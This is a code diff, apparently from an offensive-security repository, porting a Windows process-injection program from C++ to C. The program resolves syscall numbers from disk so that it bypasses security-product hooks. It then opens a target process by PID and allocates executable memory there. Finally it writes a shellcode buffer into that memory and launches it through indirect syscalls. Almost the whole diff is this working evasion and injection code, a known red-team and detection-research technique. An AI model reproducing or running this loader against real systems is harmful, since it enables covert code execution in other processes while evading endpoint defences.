@@ -1,69 +1,66 @@
 /*
 * ml64.exe /c indirect-syscalls.asm
-* cl.exe indirect-syscalls-ex.cpp ps-utils.cpp syscall-utils.cpp indirect-syscalls.obj /Fe:indirect-syscalls.exe
+* cl.exe indirect-syscalls-ex.c ..\includes\peb-eat-utils.c ..\includes\ps-utils.c ..\includes\syscall-utils.c indirect-syscalls.obj /Fe:indirect-syscalls.exe
 */
 #include <stdio.h>
-#include "syscall-utils.h"
-#include "ps-utils.h"
+#include "..\includes\syscall-utils.h"
+#include "..\includes\ps-utils.h"
 
-extern "C" {
-    DWORD wNtAllocateVirtualMemorySSN = 0;
-    UINT_PTR sysAddrNtAllocateVirtualMemory = 0;
+DWORD wNtAllocateVirtualMemorySSN = 0;
+UINT_PTR sysAddrNtAllocateVirtualMemory = 0;
 
-    DWORD wNtWriteVirtualMemorySSN = 0;
-    UINT_PTR sysAddrNtWriteVirtualMemory = 0;
+DWORD wNtWriteVirtualMemorySSN = 0;
+UINT_PTR sysAddrNtWriteVirtualMemory = 0;
 
-    DWORD wNtProtectVirtualMemorySSN = 0;
+DWORD wNtProtectVirtualMemorySSN = 0;
 
-    DWORD wNtCreateThreadExSSN = 0;
-    UINT_PTR sysAddrNtCreateThreadEx = 0;
+DWORD wNtCreateThreadExSSN = 0;
+UINT_PTR sysAddrNtCreateThreadEx = 0;
 
-    DWORD wNtWaitForSingleObjectSSN = 0;
-    UINT_PTR sysAddrNtWaitForSingleObject = 0;
-}
+DWORD wNtWaitForSingleObjectSSN = 0;
+UINT_PTR sysAddrNtWaitForSingleObject = 0;
 
-extern "C" {
-        // https://ntdoc.m417z.com/NtAllocateVirtualMemory
-        NTSTATUS IndirectSysNtAllocateVirtualMemory(
-            HANDLE ProcessHandle,    
-            PVOID* BaseAddress,      
-            ULONG_PTR ZeroBits,      
-            PSIZE_T RegionSize,      
-            ULONG AllocationType,    
-            ULONG Protect            
-        );
+// https://ntdoc.m417z.com/NtAllocateVirtualMemory
+NTSTATUS IndirectSysNtAllocateVirtualMemory(
+    HANDLE ProcessHandle,    
+    PVOID* BaseAddress,      
+    ULONG_PTR ZeroBits,      
+    PSIZE_T RegionSize,      
+    ULONG AllocationType,    
+    ULONG Protect            
+);
 
-        // https://ntdoc.m417z.com/NtWriteVirtualMemory
-        NTSTATUS IndirectSysNtWriteVirtualMemory(
-            HANDLE ProcessHandle,     
-            PVOID BaseAddress,        
-            PVOID Buffer,             
-            SIZE_T NumberOfBytesToWrite, 
-            PSIZE_T NumberOfBytesWritten 
-        );
+// https://ntdoc.m417z.com/NtWriteVirtualMemory
+NTSTATUS IndirectSysNtWriteVirtualMemory(
+    HANDLE ProcessHandle,     
+    PVOID BaseAddress,        
+    PVOID Buffer,             
+    SIZE_T NumberOfBytesToWrite, 
+    PSIZE_T NumberOfBytesWritten 
+);
 
-        // https://ntdoc.m417z.com/ntcreatethreadex
-        NTSTATUS IndirectSysNtCreateThreadEx(
-            PHANDLE ThreadHandle,        
-            ACCESS_MASK DesiredAccess,   
-            PVOID ObjectAttributes,      
-            HANDLE ProcessHandle,        
-            PVOID lpStartAddress,        
-            PVOID lpParameter,           
-            ULONG Flags,                 
-            SIZE_T StackZeroBits,        
-            SIZE_T SizeOfStackCommit,    
-            SIZE_T SizeOfStackReserve,   
-            PVOID lpBytesBuffer          
-        );
+// https://ntdoc.m417z.com/ntcreatethreadex
+NTSTATUS IndirectSysNtCreateThreadEx(
+    PHANDLE ThreadHandle,        
+    ACCESS_MASK DesiredAccess,   
+    PVOID ObjectAttributes,      
+    HANDLE ProcessHandle,        
+    PVOID lpStartAddress,        
+    PVOID lpParameter,           
+    ULONG Flags,                 
+    SIZE_T StackZeroBits,        
+    SIZE_T SizeOfStackCommit,    
+    SIZE_T SizeOfStackReserve,   
+    PVOID lpBytesBuffer          
+);
 
-        // https://ntdoc.m417z.com/NtWaitForSingleObject
-        NTSTATUS IndirectSysNtWaitForSingleObject(
-            HANDLE Handle,          
-            BOOLEAN Alertable,      
-            PLARGE_INTEGER Timeout  
-        );
-}
+// https://ntdoc.m417z.com/NtWaitForSingleObject
+NTSTATUS IndirectSysNtWaitForSingleObject(
+    HANDLE Handle,          
+    BOOLEAN Alertable,      
+    PLARGE_INTEGER Timeout  
+);
+
 
 int main(int argc, char* argv[]) {
     unsigned char buf[] =
@@ -99,12 +96,14 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Running PI with target PID: %u\n", pid);
 
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+
 	// Dynamically find the SSNs from disk, bypassing memory hooks
-	wNtAllocateVirtualMemorySSN = GetSSNByName("NtAllocateVirtualMemory");
-	wNtWriteVirtualMemorySSN = GetSSNByName("NtWriteVirtualMemory");
-	wNtProtectVirtualMemorySSN = GetSSNByName("NtProtectVirtualMemory");
-	wNtCreateThreadExSSN = GetSSNByName("NtCreateThreadEx");
-	wNtWaitForSingleObjectSSN = GetSSNByName("NtWaitForSingleObject");
+	wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
+	wNtWriteVirtualMemorySSN = GetSSNByName(pPeb, "NtWriteVirtualMemory");
+	wNtProtectVirtualMemorySSN = GetSSNByName(pPeb, "NtProtectVirtualMemory");
+	wNtCreateThreadExSSN = GetSSNByName(pPeb, "NtCreateThreadEx");
+	wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");
 
 	if (!wNtAllocateVirtualMemorySSN) {
 		printf("[!] Error: Could not find clean SSNs from disk.\n");
@@ -131,7 +130,7 @@ int main(int argc, char* argv[]) {
 	sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
 	
     // Open a handle to the current process, this must be passed to VirtualAllocEx
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
@@ -139,19 +138,20 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Successfully opened handle to PID: %u\n", pid);
 
+    printf("[*] Waiting for thread with IndirectSysNtAllocateVirtualMemory.\n");
     PVOID bufferAddress = NULL;
 	SIZE_T buffSize = sizeof(buf); 
-	//SysNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 	IndirectSysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
+    printf("[*] Waiting for thread with IndirectSysNtWriteVirtualMemory.\n");
 	SIZE_T bytesWritten;
-	//SysNtWriteVirtualMemory(GetCurrentProcess(), bufferAddress, buf, sizeof(buf), &bytesWritten);
     IndirectSysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);
 
+    printf("[*] Waiting for thread with IndirectSysNtCreateThreadEx.\n");
 	HANDLE hThread;	
-	//SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
     IndirectSysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
 	
+    printf("[*] Waiting for thread with IndirectSysNtWaitForSingleObject.\n");
 	IndirectSysNtWaitForSingleObject(hThread, FALSE, NULL);
     printf("[+] Process injection complete.\n");
     return 0;
